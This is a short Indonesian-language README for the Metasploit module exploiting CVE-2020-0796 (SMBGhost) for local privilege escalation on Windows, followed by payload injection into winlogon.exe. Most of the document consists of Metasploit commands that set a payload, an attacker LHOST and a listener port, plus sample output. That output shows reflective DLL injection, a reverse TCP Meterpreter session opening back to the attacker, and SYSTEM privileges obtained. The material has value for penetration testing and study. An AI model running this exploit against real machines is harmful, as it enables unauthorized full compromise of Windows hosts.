# cve_2020_0796_smbghost

Terdapat kerentanan pada protokol Microsoft Server Message Block `3.1.1` (`SMBv3`) yang dapat dimanfaatkan untuk mengeksekusi kode pada server yang rentan.

Implementasi exploit lokal ini memanfaatkan kerentanan tersebut untuk menaikkan hak akses (`privilege escalation`), sebelum melakukan injeksi payload ke dalam proses `winlogon.exe`.

## Penulis
- [Daniel García Gutiérrez](https://www.umanresa.cat/ca/professorat/daniel-garcia-gutierrez)
- [Manuel Blanco Parajón](https://x.com/dialluvioso_)
- [Spencer McIntyre](https://github.com/zerosteiner)

## Platform
- `Windows`

## Arsitektur
- `x86`, `x64`


## Cara Penggunaan di Metasploit

```
use exploit/windows/local/cve_2020_0796_smbghost
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Windows Build Number = 10.0.18363.0
[+] The target appears to be vulnerable.
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 6076 launched.
[*] Reflectively injecting the DLL into 6076...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.1.51
[*] Meterpreter session 2 opened (192.168.1.11:4444 -> 192.168.1.51:49782) at 2025-05-17 17:09:49 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi:
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/cve_2020_0796_smbghost/)
